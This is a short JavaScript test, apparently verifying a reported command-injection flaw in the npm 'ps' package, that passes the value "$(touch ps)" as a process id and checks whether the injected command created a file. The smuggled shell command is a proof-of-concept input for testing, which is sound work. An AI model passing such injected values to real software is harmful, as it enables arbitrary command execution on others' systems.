//https://hackerone.com/reports/390848
test("Command Injection in ps", () => 
{
	const ps = require('ps');
	const fs = require('fs');
	const path = './ps';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	ps.lookup({ pid: "$(touch ps)" }, function(err, proc) { // this method is vulnerable to command injection
		//if (err) {throw err;}
	});

	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
